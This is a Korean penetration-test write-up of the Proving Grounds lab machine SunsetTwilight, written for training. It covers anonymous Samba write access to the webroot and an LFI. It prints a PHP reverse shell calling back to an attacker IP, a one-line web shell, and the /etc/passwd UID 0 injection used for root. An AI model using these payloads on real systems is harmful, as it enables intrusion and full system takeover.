---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/svc/smb
  - tech/enum/dirbust
  - tech/payload/revshell
  - tech/lin/passwd-write
type: machine
platform: pg
os: linux
ip: 192.168.103.91
ports: [22, 25, 80, 139, 445, 2121, 3306, 8080, 63525]
services: [ftp, http, mysql, netbios-ssn, smtp, ssh]
status: solved
manual_tags: true
manual_cves: true
tech_count: 4
---

> [!info] 요약
> **SunsetTwilight** · Proving Grounds Fundamental · Debian 10 buster(커널 4.19.0-9-amd64, 호스트명 `twilight`) · **플래그 2개**
> 진입점: 445 Samba 널 세션 → 공유 `WRKSHARE` 가 파일시스템 루트(`/`)를 노출 → `\var\www\html` 웹소스 전량 회수 → 같은 공유에 PHP 리버스셸 업로드 → 80 으로 요청해 www-data 대화형 pty 확보
> 권한상승: `/etc/passwd` 가 world-writable → SHA-512 crypt 해시를 넣은 UID 0 행 `pwn` 추가 → 대화형 셸에서 `su pwn` → root
> `local.txt` = `99478f12dd318139a0c9ce66783e9bff`(www-data) · `proof.txt` = `86c2cd264f96513cbc618d5185320290`(root)
> 시행착오·교훈 → [[_PLAYBOOK]]

## Target #1 – 192.168.103.91

### Initial Access – 익명 SMB 공유가 파일시스템 루트를 노출해 웹루트에 리버스셸을 직접 심은 경로

**Vulnerability Explanation:**
- Samba 공유 `WRKSHARE` 의 `path` 가 파일시스템 루트(`/`)로 잡혀 있어, 공유 내부 경로가 `\var\www\html`·`\tmp`·`\home\miguel`·`\etc\shadow` 로 그대로 매핑
- 널 세션(익명)으로 그 공유가 열려 있어 인증 없이 목록·다운로드 가능. `\home\miguel\*`·`\root\*`·`\etc\shadow` 는 파일 단위 유닉스 권한이 막아 `NT_STATUS_ACCESS_DENIED` 반환
- `\var\www\html` 의 모드는 `drwsr-xr-x www-data:www-data` 로 다른 사용자 쓰기 부재. 그럼에도 익명 세션의 `put` 이 성립 — 그 세션이 `www-data` 로 매핑돼 소유자 권한으로 쓴 것
- 매핑 대상이 root 가 아닌 근거는 `\root` 목록과 `\etc\shadow` 열기가 둘 다 `NT_STATUS_ACCESS_DENIED` 인 것. `smb.conf` 원문 미보존
- 그 디렉터리가 Apache 웹루트이자 PHP 실행 대상 — 파일 하나를 올리고 80 으로 요청하면 그대로 코드 실행

**Vulnerability Fix:**
- 공유 `path` 를 파일시스템 루트가 아닌 전용 디렉터리로 한정할 것. 루트 공유는 유닉스 권한이 최후 방어선 하나만 남는 구성
- `smb.conf` 에서 `guest ok = no`·`map to guest = never` 로 널 세션을 차단하고, 업무 공유는 인증 사용자로 제한
- 웹루트를 SMB 로 내보내야 하면 해당 공유를 `read only = yes` 로 두거나, Apache 쪽에서 업로드 경로의 PHP 핸들러를 해제할 것

**Severity:** Critical — 무인증 원격 사용자가 웹루트에 임의 PHP 파일을 배치해 `www-data` 원격 코드 실행에 도달. `local.txt` 도 같은 공유로 직접 회수 가능

**Steps to reproduce the attack:**
1. `445/tcp` 널 세션으로 공유 목록 열거
2. `WRKSHARE` 에 익명 접속해 `\var\www\html` 소스 회수
3. 같은 공유에 리버스셸 PHP 업로드
4. Kali 에 `443/tcp` 리스너 기동
5. `80/tcp` 로 업로드한 PHP 요청
6. 붙은 셸을 `python3 -c 'import pty;pty.spawn("/bin/bash")'` 로 pty 승격

### Service Enumeration

**Port Scan Results**

| IP Address | Ports Open |
|---|---|
| 192.168.103.91 | TCP: 22, 25, 80, 139, 445, 2121, 3306, 8080, 63525 |

```bash
ssh kali@10.44.44.128 "nmap -sCV -p- -Pn -n -A --min-rate 5000 -oN ~/PG/SunsetTwilight/nmap-full.txt 192.168.103.91"
```

```text
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
25/tcp    open  smtp        Exim smtpd
80/tcp    open  http        Apache httpd 2.4.38 ((Debian))
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
2121/tcp  open  ftp         pyftpdlib 1.5.6
3306/tcp  open  mysql       MariaDB 5.5.5-10.3.22
8080/tcp  open  http        PHP cli server 5.5 or later
63525/tcp open  http        PHP cli server 5.5 or later
```
— 출처: `~/PG/SunsetTwilight/nmap-full.txt` · 스크립트 출력 행은 생략, 포트 행만 인용

`63525/tcp` 가 전체 포트 스캔에서만 잡혀 `-p-` 가 필수. 상위 1000 포트 기준 스캔은 8080 과 짝을 이루는 두 번째 PHP 서버를 통째로 놓침. UDP top100 은 `closed` 11개·`open|filtered` 89개로 `open` 확정 포트 부재.

버전·역할 판정 근거:
- `smb-os-discovery` 가 `Samba 4.9.5-Debian`·컴퓨터명 `twilight` 를 보고. 같은 스캔의 `OS: Windows 6.1` 은 Samba 가 내보내는 호환 문자열이라 실제 OS 판정 근거가 아님
- 셸 확보 후 `uname -a` 와 `/etc/os-release` 가 `Debian GNU/Linux 10 (buster)`·`4.19.0-9-amd64` 로 확정 — 두 근거가 리눅스를 가리켜 확정

포트 80 은 `index.php` 한 장에 링크 둘. 갤러리 DB 를 표방하나 실제 DB 연동 부재.

```text
/index.php            (Status: 200) [Size: 228]
/gallery              (Status: 301) [Size: 318] [--> http://192.168.103.91/gallery/]
/javascript           (Status: 301) [Size: 321] [--> http://192.168.103.91/javascript/]
/lang.php             (Status: 200) [Size: 0]
/current.php          (Status: 200) [Size: 152]
```
— 출처: `~/PG/SunsetTwilight/gobuster-80.txt` · 원문 6행 중 `/.` 중복 행 생략

![[PG-SunsetTwilight-80-index.png]]
*그림 1 — 80 루트. 링크 두 개(`pictures`·`Change language`)뿐이고 URL 은 화면에 비노출. 대상 경로 `current.php?id=1`·`lang.php?lang=en` 은 HTML 소스에서 확인*

`lang.php` 는 필터 부재의 include 한 줄. 경로 트래버설이 그대로 통해 `/etc/passwd` 반환.

```php
<?php

$lang = $_GET['lang'];

include('./' . $lang);

?>
```
— 출처: `~/PG/SunsetTwilight/srcloot/lang.php`

```text
--- lang=../../../../../../etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
```
— 출처: `~/PG/SunsetTwilight/enum2.txt` · 응답 앞 5행만 인용

이 LFI 는 확인만 하고 진입에 미사용 — SMB 쓰기가 먼저 성립해 코드 실행이 그쪽으로 도달.

`current.php?id=1` 은 SQL 오류 문자열을 그대로 뱉어 SQLi 처럼 보이나 **미끼**. 회수한 파일이 152바이트짜리 정적 텍스트이고 PHP 태그조차 부재.

```text
0000000   E   r   r   o   r   :       Y   o   u       h   a   v   e    
0000020   a   n       e   r   r   o   r       i   n       y   o   u   r
0000040       m   y   s   q   l       s   y   n   t   a   x   ;       c
```
— 출처: `~/PG/SunsetTwilight/shell443b.log` · `od -c /var/www/html/current.php` 앞 3행

![[PG-SunsetTwilight-80-current-sqlerror.png]]
*그림 2 — `current.php?id=1` 응답. 파라미터를 어떻게 바꿔도 같은 문자열이 나오고, `id=1'` 도 동일 — 오류 메시지가 «생성»되지 않고 «저장»돼 있다는 신호*

![[PG-SunsetTwilight-80-gallery.png]]
*그림 3 — `/gallery/` 의 Max's Image Upload(2008). `maxImageUpload.class.php` 는 클라이언트가 보낸 `$_FILES['myfile']['type']` 만 대조하고 확장자 검사 부재. 저장 파일명도 `basename()` 로 원본 유지 — SMB 쓰기가 먼저 성립해 이 경로는 배제가 아니라 미시도*

8080 과 63525 는 같은 Easy File Sharing Web Server 테마를 서빙하는 PHP 내장 서버 두 개. 응답 본문 길이만 2바이트 차이(12447 / 12449).

![[PG-SunsetTwilight-8080-efs-login.png]]
*그림 4 — 8080 로그인 화면. 폼이 있으나 POST 처리 엔드포인트 부재의 정적 테마 — 이 화면이 실 애플리케이션이라는 인상 자체가 유도 장치*

SMB 널 세션이 공유 셋을 반환. `WRKSHARE` 의 주석이 접근을 말리는 문구인 것과 달리 실제로는 익명 접근 허용.

```bash
ssh kali@10.44.44.128 "smbclient -N -L //192.168.103.91"
```

```text
	Sharename       Type      Comment
	---------       ----      -------
	WRKSHARE        Disk      Workplace Share. Do not access if not an employee.
	print$          Disk      Printer Drivers
	IPC$            IPC       IPC Service (Samba 4.9.5-Debian)
```
— 출처: `~/PG/SunsetTwilight/svc/smb-shares-null.txt`

`WRKSHARE` 루트 목록이 `bin`·`boot`·`etc`·`home`·`proc`·`root`·`sys`·`var`·`vmlinuz` 를 그대로 보임 — 공유가 `/` 그 자체.

```text
  root                                D        0  Wed Sep  9 11:20:07 2026
  etc                                 D        0  Mon Sep 14 23:04:33 2020
  vmlinuz                             N  5274864  Mon Jun  8 00:42:22 2020
  home                                D        0  Thu Jul  9 08:15:56 2020
  var                                 D        0  Thu Jul  9 09:03:27 2020

\root
NT_STATUS_ACCESS_DENIED listing \root\*
```
— 출처: `~/PG/SunsetTwilight/enum2.txt` · 루트 목록 29행 중 5행을 원문 순서대로, 이어서 `\root` 시도

> [!warning] `smbmap` 의 `READ ONLY` 판정은 이 박스에서 오탐
> 널 세션 `smbmap` 이 `WRKSHARE` 를 `READ ONLY` 로 보고(`~/PG/SunsetTwilight/svc/smbmap-null.txt`). 실제로는 `\tmp` 와 `\var\www\html` 양쪽에 `put` 성공.
> `smbmap` 의 쓰기 판정은 공유 루트 기준이라, 공유가 `/` 이면 루트(root 소유)에서 막힌 결과가 공유 전체 판정으로 올라감. **자동 도구의 쓰기 판정을 부재 근거로 쓰면 이 박스의 유일한 진입점이 사라짐** — 노리는 하위 경로에서 직접 `put` 해 볼 것.

쓰기 여부는 실제 업로드로 확인. `\tmp` 와 웹루트 양쪽에 임시 파일 배치 성공.

```text
=== write test ===
putting file /tmp/wtest.txt as \tmp\wtest.txt (0.0 kB/s) (average 0.0 kB/s)
  wtest.txt                           A        6  Wed Sep  9 11:25:36 2026
```
— 출처: `~/PG/SunsetTwilight/enum3.txt`

```text
=== write to /var/www/html test ===
putting file /tmp/t.php as \var\www\html\t.php (0.1 kB/s) (average 0.1 kB/s)
539
```
— 출처: `~/PG/SunsetTwilight/enum4.txt` · `put` 직후 이어진 `539` 는 80 으로 되받은 응답 본문. 요청 명령 원문 미보존

같은 공유로 웹소스 전량과 `local.txt` 를 그대로 회수. `\home\miguel` 은 `NT_STATUS_ACCESS_DENIED` 라 일반 사용자 계정 자산은 이 경로로 미회수.

```text
getting file \var\www\html\current.php of size 152 as current.php
getting file \var\www\html\lang.php of size 58 as lang.php
getting file \var\www\html\index.php of size 228 as index.php
getting file \var\www\html\gallery\maxImageUpload.class.php of size 8916 as maxImageUpload.class.php
getting file \var\www\local.txt of size 33 as local.txt
```
— 출처: `~/PG/SunsetTwilight/enum4.txt` · 전송률 표기 생략

포트 25·2121·3306 은 진입점 부재. 판정 근거는 아래 「막힌 벡터」 절.

### Initial Access – WRKSHARE 경유 웹셸 배치

<이 경로의 일반 절차와 시행착오는 [[_PLAYBOOK]] 참조>

익명 SMB 쓰기가 웹루트에 닿는 것이 확인됐으므로, 웹셸과 리버스셸 두 장을 같은 경로로 올려 실행 채널을 이중화. 웹셸은 재접속용, 리버스셸은 대화형 셸 확보용.

```php
<?php
$s=@fsockopen("192.168.45.247",443);
if($s){ $d=array(0=>$s,1=>$s,2=>$s); $p=proc_open("/bin/bash -i",$d,$pipes); proc_close($p); }
else { echo "fail443"; }
?>
```
— 출처: `~/PG/SunsetTwilight/rev.php`

```php
<?php system($_REQUEST["c"]); ?>
```
— 출처: `~/PG/SunsetTwilight/shell.php`

`fsockopen` + `proc_open` 조합을 쓴 이유는 실패를 «식별»하기 위한 것. `bash -i >& /dev/tcp/...` 한 줄짜리는 붙지 않았을 때 타겟 egress 차단인지 리스너 문제인지 구분이 안 되나, 이 형태는 소켓 개방 실패 시 `fail443` 문자열을 HTTP 응답으로 되돌려 계층 분리 가능.

두 파일의 배치 명령 원문 미보존. 웹루트 쓰기 채널로 실증된 것은 익명 SMB `put` 하나(위 `enum4.txt` 의 `t.php`).

Kali `443/tcp` 리스너에 connect-back 이 도달.

```text
listening on [any] 443 ...
connect to [192.168.45.247] from (UNKNOWN) [192.168.103.91] 58554
bash: cannot set terminal process group (690): Inappropriate ioctl for device
bash: no job control in this shell
```
— 출처: `~/PG/SunsetTwilight/shell443b.log`

붙은 셸은 job control 부재의 비 pty 라 `su` 불가. `python3` 로 pty 를 띄우고 `TERM` 을 채운 뒤 `local.txt` 원위치 읽기.

```bash
www-data@twilight:/var/www/html$ python3 -c 'import pty;pty.spawn("/bin/bash")'
```
— 출처: `~/PG/SunsetTwilight/shell443b.log`

```bash
www-data@twilight:/var/www/html$ export TERM=xterm; export SHELL=/bin/bash
```
— 출처: `~/PG/SunsetTwilight/shell443.log` · 같은 로그의 pty 기동 명령 행은 에코 파손으로 판독 불가

이 pty 승격이 뒤의 권한상승에서 필수. `su` 는 비밀번호를 제어 터미널에서 읽으므로, pty 부재 상태에서 파이프로 넘긴 비밀번호는 수용 거부.

**수동 대안** — `python3` 부재 시 `script -qc /bin/bash /dev/null` 로 같은 pty 를 확보 가능. 이 박스에서는 `python3` 가 존재해 미실행.

**Local.txt value:**

```bash
www-data@twilight:/var/www/html$ whoami; id; hostname; hostname -I; date; cat /var/www/local.txt
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
twilight
192.168.103.91 
Tue Sep  8 22:27:03 EDT 2026
99478f12dd318139a0c9ce66783e9bff
www-data@twilight:/var/www/html$ 
```
— 출처: `~/PG/SunsetTwilight/proof_user.txt` · `shell443.log` 의 대화형 pty 세션 원문. 말미 출처 주석 행 생략

터미널 세션이라 별도 그림 부재 — 채점 3요건(플래그 값 · `hostname -I` 의 타깃 IP · `id`/`whoami` 권한)이 위 한 화면에 공존. 인스턴스 정지로 재촬영 불가.

`local.txt` 는 SMB 로도 회수 가능하나(`enum4.txt`), 웹셸·파일 복사 경유 취득은 시험 규정상 미인정이라 위 대화형 셸 판이 제출 근거.

### Privilege Escalation – world-writable `/etc/passwd` 에 UID 0 계정 추가

**Vulnerability Explanation:**
- `/etc/passwd` 의 퍼미션이 다른 사용자 쓰기까지 허용 — `www-data` 가 계정 데이터베이스를 직접 편집 가능
- `/etc/shadow` 가 존재해도 `passwd` 의 두 번째 필드가 `x` 가 아닌 crypt 해시면 glibc 계열 인증이 그 값을 우선 사용 — shadow 를 읽지 못해도 우회 성립
- UID·GID 를 0 으로 둔 새 행을 추가하면 신규 계정이 root 와 동등한 자격. `root` 행 자체는 무변경이라 기존 로그인이 그대로 살아 탐지 지연
- `su` 로 그 계정에 전환하면 비밀번호를 아는 쪽이 그대로 uid 0 획득

**Vulnerability Fix:**
- `/etc/passwd` 를 `root:root 0644` 로 되돌리고, 파일 권한을 검사하는 무결성 점검(`debsums`·AIDE 등)을 주기 실행할 것
- 근본 원인은 웹 서비스 계정이 시스템 파일에 쓰기를 갖는 구성. `www-data` 를 최소 권한으로 되돌리고 웹루트 밖 쓰기를 제거할 것
- 방어 심화로 `usr/sbin/nologin` 셸 강제·UID 0 중복 계정 탐지 룰을 추가할 것

**Severity:** Critical — 셸을 쥔 임의의 저권한 계정이 명령 두 줄로 root. 익스플로잇·커널 취약점·자격증명 크랙 전부 불필요

**Steps to reproduce the attack:**
1. 쓰기 가능 경로 탐색으로 `/etc/passwd` 확인
2. Kali 에서 SHA-512 crypt 해시 생성
3. 그 해시를 넣은 UID 0 행을 `/etc/passwd` 에 추가
4. 대화형 pty 에서 `su pwn`
5. `/root/proof.txt` 원위치 읽기

권한상승 작업은 재접속한 두 번째 `www-data` 셸에서 수행. 첫 세션이 끊긴 뒤 심어 둔 `rev.php` 를 다시 트리거해 확보(`shell443b.log` 의 두 번째 `connect to` 행).

셸 확보 직후 열거를 한 번에 돌림. 정석 벡터가 전부 닫혀 있어 파일 권한 쪽으로 방향을 돌린 것이 이 박스의 분기점.

```bash
www-data@twilight:/tmp$ sh /tmp/.h.sh > /tmp/.h.out 2>&1; echo HARVEST_DONE; wc -l /tmp/.h.out
```

```text
===== SUDO =====
sudo: a password is required

===== SUID =====
/usr/sbin/exim4
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/fusermount
/usr/bin/chsh
/usr/bin/umount
/usr/bin/mount
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/su

===== CAPS =====
/usr/bin/ping = cap_net_raw+ep
```
— 출처: `~/PG/SunsetTwilight/harvest_target.txt` · SUID 절은 Debian 기본군까지 11행, 웹루트 하위 항목은 생략

이 출력에서 고른 것은 **부재의 조합**. `sudo` NOPASSWD 부재, 비표준 SUID 부재, 유효한 capability 부재, 주기 cron 부재 — 프로세스·바이너리 계열이 전부 닫혀 남는 것이 파일 퍼미션.

`miguel` 의 `@reboot` 크론이 8080·63525 PHP 서버와 2121 pyftpdlib 를 구동. 셋 다 `miguel` 권한이고 소스·인자에 조작 지점 부재.

```text
miguel     396  ... \_ /bin/sh -c /usr/bin/php -S 0.0.0.0:63525 -t /home/miguel/efs2
miguel     392  ... \_ /bin/sh -c /usr/bin/python -m pyftpdlib -w -p 2121 -d /home/miguel/ftp
miguel     395  ... \_ /bin/sh -c /usr/bin/php -S 0.0.0.0:8080 -t /home/miguel/efs
```
— 출처: `~/PG/SunsetTwilight/harvest_target.txt` PROCS 절 · `ps auxf` 트리 표기의 상위 `CRON -f` 행은 생략

`www-data` 자신의 crontab 에도 같은 서비스 셋 존재. 다만 대상 디렉터리가 `/var/tmp/efs`·`/var/tmp/ftp` 로 **부재 경로**.

- 부팅마다 기동 실패 — cron 에러 메일이 `/var/mail/www-data` 에 46KB 누적(전량 노이즈)
- `/var/tmp` 는 쓰기 가능 — 디렉터리를 만들어 두면 다음 부팅 시 `www-data` 권한 서비스 기동
- 그 서비스가 `@reboot` 로만 기동하고 박스 재부팅이 스코프 밖이라 이 경로는 미사용

```text
@reboot /usr/bin/php -S 0.0.0.0:8080 -t /var/tmp/efs
@reboot /usr/bin/python -m pyftpdlib -w -p 2121 -d /var/tmp/ftp
```
— 출처: `~/PG/SunsetTwilight/harvest_target.txt` CRON 절 · `crontab -l` 의 주석 머리말 생략

> [!note] `/etc/passwd` 해시 필드가 살아 있는 이유
> shadow 도입 후에도 glibc 의 `getpwnam` 은 `passwd` 두 번째 필드를 그대로 반환하고, 그 값이 `x` 가 아니면 인증 루틴이 shadow 를 참조하지 않고 그 문자열을 crypt 결과와 대조.
> 그래서 `/etc/shadow` 를 못 읽어도 `/etc/passwd` 쓰기 하나로 계정 신설이 성립. 조건은 그 파일에 대한 쓰기 권한 하나뿐.

Kali 에서 SHA-512 crypt 해시를 만들어 UID 0 행을 추가. 큰따옴표 안의 `$` 가 셸 변수로 확장돼 **해시 필드가 한 글자로 소실된 시도**가 pty 로그에 잔존.

```bash
www-data@twilight:/var/www/html$ echo "pwn:$1$tw$WPDGDCRz4U4wAtsevbkDE.:0:0:root:/root:/bin/bash" >> /etc/passwd; tail -2 /etc/passwd
mysql:x:108:118:MySQL Server,,,:/nonexistent:/bin/false
pwn:.:0:0:root:/root:/bin/bash
```
— 출처: `~/PG/SunsetTwilight/shell443b.log`

이 한 블록의 증거는 둘.

- **`/etc/passwd` 쓰기 성립** — `>>` 가 오류 없이 통과하고 `tail` 에 새 행이 잡힘. `www-data` 로 시스템 계정 파일에 추가 성공
- **`$` 확장 함정** — `$1`·`$tw`·`$WPDGDCRz4U4wAtsevbkDE` 가 전부 빈 변수로 치환돼 해시가 `.` 하나로 축소. 리버스셸·`curl`→`bash` 처럼 셸을 두 단계 이상 거치면 확장이 중첩 발생

그런데 `tail -2` 가 [`mysql:…`, `pwn:.`] 이라 이 시점 파일 **끝**에 유효한 `pwn` 행 부재. 그럼에도 일곱 행 뒤 `su pwn` 이 즉시 성공.

- **해시 필드 `.` 로는 인증 불성립** — glibc `crypt()` 에 한 글자 salt 를 넘기면 `.` 이 아닌 값 반환. Kali 실행 `perl -e 'print crypt("pass123",".")'` → `*0`
- **`getpwnam()` 은 첫 일치를 반환** — `/etc/passwd` 를 위에서부터 훑으므로 뒤에 붙은 파손 행은 도달 불가
- **셸 확보 직후 열거 시점에는 `pwn` 행 부재** — `harvest_target.txt` USERS 절(01:09:17 EDT)의 마지막 행이 `mysql:…`

세 관측이 하나의 결론을 강제. 유효한 `pwn` 행은 `mysql` 행 **위**에 이미 삽입된 상태였고, `su` 가 집은 것이 그 행. 말미의 파손 행은 무시된 잔재.

그 행을 넣은 명령의 원문 미보존 — pty 로그에 잡히지 않는 웹셸 채널 경유. 확장을 피하는 형태는 둘이고, 셸 계층 수를 세지 않아도 되는 두 번째가 안전.

- 홑따옴표로 감쌀 것 — `echo 'pwn:$6$...:0:0:root:/root:/bin/bash' >> /etc/passwd`
- 해시를 base64 로 감싸 전송하고 타겟에서 `base64 -d` 할 것 — 중간 셸이 몇 겹이든 `$` 노출 부재

pty 위에서 `su` 로 전환. 비밀번호는 해시 생성 시 사용한 값.

```bash
www-data@twilight:/var/www/html$ su pwn
Password: 
root@twilight:/var/www/html# id; whoami; hostname; hostname -I; date; cat /root/proof.txt
uid=0(root) gid=0(root) groups=0(root)
root
twilight
192.168.103.91 
Wed 09 Sep 2026 01:23:55 AM EDT
86c2cd264f96513cbc618d5185320290
```
— 출처: `~/PG/SunsetTwilight/shell443b.log`

**수동 대안** — `openssl passwd -6` 가 없으면 `python3 -c 'import crypt;print(crypt.crypt("pass","$6$salt"))'` 또는 `mkpasswd -m sha-512` 로 같은 해시 생성 가능. 이 박스에서는 Kali 의 `openssl` 을 사용.

### 막힌 벡터

「배제」와 「미완」을 갈라 적음. 배제는 행동으로 반증한 것, 미완은 수단이 성립하지 않아 판정에 이르지 못한 것.

| 벡터 | 판정 | 근거 |
|---|---|---|
| Exim 4.92 CVE-2019-10149 | 배제 | 25번에 `${run{...}}` 로컬파트를 직접 타전 → `501 @ or . expected` 로 RCPT 거부. 배너가 아니라 실제 응답으로 반증. 4.92 는 패치판이라 로컬파트 확장 미수행 |
| Exim 설정·스풀 | 배제 | `/etc/exim4` 쓰기 불가, `/var/spool/exim4` 읽기 불가. `dc_eximconfig_configtype=local` 표준 구성 |
| FTP 2121 익명 쓰기 | 배제 | `-w` 플래그로 기동됐으나 `STOR` → `550 Permission denied`. 루트 디렉터리 `/home/miguel/ftp` 가 root 소유 |
| MySQL 3306 root | 배제 | `mysql -uroot` → `ERROR 1698 (28000): Access denied for user 'root'@'localhost'` — `unix_socket` 인증. 웹소스에 DB 자격증명 부재이고 gallery 는 DB 미사용 |
| 8080·63525 경로 트래버설 | 배제 | `../../etc/passwd`·`%2e%2e`·`..%5c`·`....//` 전부 docroot 로 정규화돼 로그인 페이지 반환. PHP 내장 서버의 임의 파일 읽기 불가 |
| 8080 EFS 엔드포인트 | 배제 | `index`·`upload`·`config`·`admin`·`shell` 등 11종 퍼징 전부 404. 정적 테마라 실 엔드포인트 부재 |
| `.twilight` FTP 파일 | 배제 | 35바이트. rot13·rot47·역순 전부 무의미 출력. 권한상승과 무관한 미끼 |
| `pspy64`·`pspy64s` | **미완** | 두 바이너리 모두 `GLIBC_2.34` 요구, 타겟 glibc 2.28 → 실행 자체가 불성립. `ps` 폴링 루프로 대체했으나 주기 cron 부재라 소득 부재 |

```text
/tmp/.p: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by /tmp/.p)
/tmp/.p: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.32' not found (required by /tmp/.p)
```
— 출처: `~/PG/SunsetTwilight/shell443b.log`

Exim·FTP·8080 퍼징의 개별 응답은 원문 미보존 — 시도 당시 파일 저장 누락.

### Post-Exploitation

`su pwn` 으로 전환한 root pty 에서 `/root/proof.txt` 를 원위치 `cat`. 파일 이동·웹셸 경유 부재.

```bash
root@twilight:/var/www/html# whoami; id; hostname; hostname -I; date; cat /root/proof.txt
root
uid=0(root) gid=0(root) groups=0(root)
twilight
192.168.103.91 
Wed 09 Sep 2026 01:25:31 AM EDT
86c2cd264f96513cbc618d5185320290
root@twilight:/var/www/html#
```
— 출처: `~/PG/SunsetTwilight/proof_root.txt` · 말미 출처 주석 행 생략. `www-data@twilight:...$` → `root@twilight:...#` 프롬프트 전환은 `shell443b.log` 에 연속 존재

터미널 캡처라 별도 그림 부재 — 채점 3요건이 위 한 화면에 공존. 인스턴스 정지로 재촬영 불가.

**Proof.txt value:**
`86c2cd264f96513cbc618d5185320290`

- 획득 권한 — `root`
- 플래그 전수 탐색은 `www-data` 단계에서 `/var/www/local.txt` 하나만 회수(`harvest_target.txt` FLAGS 절). `/root/proof.txt` 는 root 획득 후 접근
- 이 박스의 채점 플래그는 `local.txt`·`proof.txt` 둘(포털 완료 2/2)

**남긴 흔적** — 되돌리지 않은 변경. 랩 인스턴스는 이미 정지돼 원복 불가. 실 평가라면 아래 전부를 보고서에 적고 제거해야 하는 항목

| 종류 | 대상 | 내용 | 복구 여부 |
|---|---|---|---|
| 계정 | `/etc/passwd` 의 `pwn` | UID 0·GID 0, 홈 `/root`, 셸 `/bin/bash`. 실 평가에서 가장 위험한 잔존물 | 잔존 |
| 업로드 파일 | `/var/www/html/rev.php`·`shell.php`·`t.php` | 리버스셸·웹셸·SMB 쓰기 확인용 테스트 파일 | 잔존 |
| 업로드 파일 | `/tmp/.h.sh`·`/tmp/.h/`·`/tmp/.p`·`/tmp/.mon.out` | 열거 스크립트와 그 출력, 프로세스 감시 로그 | 잔존 |
| 업로드 파일 | `/tmp/wtest.txt` | SMB 익명 쓰기 확인용 6바이트 파일 | 잔존 |
| 설정 변경 | — | 변경 없음 | 해당 없음 |

- 공격 호스트(Kali)에 tmux 세션 `tw443`(nc 리스너)·`twhttp`(python http 8899) 잔존 — 다음 박스 작업 전 세션 이름 지정 종료 필요
- 이 세션의 LHOST — `192.168.45.247`(VPN 재접속마다 변동)

## 관련

- `smbclient`·`smbmap` — https://www.samba.org/ · https://github.com/ShawnDEvans/smbmap
- `pyftpdlib` — https://github.com/giampaolo/pyftpdlib
- 산출물 — `~/PG/SunsetTwilight/` 전량. nmap 4종 · `enum1`~`enum4` · `svc/` · `srcloot/` 웹소스 · `web-80/`·`web-8080/` 응답 본문
- 산출물(계속) — `harvest_target.txt` · `shell443.log` · `shell443b.log` · `proof_user.txt` · `proof_root.txt` · `rev.php` · `shell.php`
- 볼트 반입분 — `파일보관\PG-SunsetTwilight-*.png` 4장
- 원문 미보존 항목
  - Exim 25번 `${run{...}}` RCPT 타전 세션 — 응답 `501 @ or . expected` 만 기록, 요청·응답 원문 부재
  - FTP `STOR` 시도와 `550 Permission denied` 응답 원문
  - 8080 EFS 엔드포인트 퍼징 11종의 개별 404 응답
  - 유효한 `pwn` 행을 넣은 명령 — 웹셸 채널 경유라 pty 로그에 미기록
  - `rev.php`·`shell.php` 를 웹루트에 배치한 명령 — 어느 산출물에도 부재
  - `/etc/passwd` 의 모드 문자열 — 쓰기 성립은 append 성공으로 확인, `ls -l` 원문 부재
  - `find -writable` 스코프 스캔 출력 — `harvest_target.txt` WRITABLE 절은 디렉터리만 담고 `/etc/passwd` 부재
- [[Twiggy]] — `/etc/passwd` 에 UID 0 계정을 추가해 root 를 얻는 동일 기법. 그쪽은 파일 쓰기 수단이 CVE 두 개의 연쇄, 이쪽은 퍼미션 오설정 하나
- [[LazySysAdmin]] — Samba 널 세션 공유가 웹루트를 노출하는 동일 구도. 그쪽은 공유에서 «자격증명을 읽는» 방향, 이쪽은 «파일을 쓰는» 방향
- **"자동 도구가 공유를 READ ONLY 로 판정했는데 실제로는 쓰기가 된다"** 패턴 — [[_PLAYBOOK]] 참조
- **"셸을 두 단계 거치면 `$` 가 확장돼 해시·페이로드가 소실된다"** 패턴 — [[_PLAYBOOK]] 참조
- [[_PLAYBOOK#B-37. `/etc/shadow` 행 선삽입 — `getspnam()` first-match]] — 같은 first-match 원리. 이 박스는 `/etc/passwd`·`getpwnam()` 쪽
- [[_PLAYBOOK]] — 시행착오·시험 관점·기법 카드의 유일한 소재지
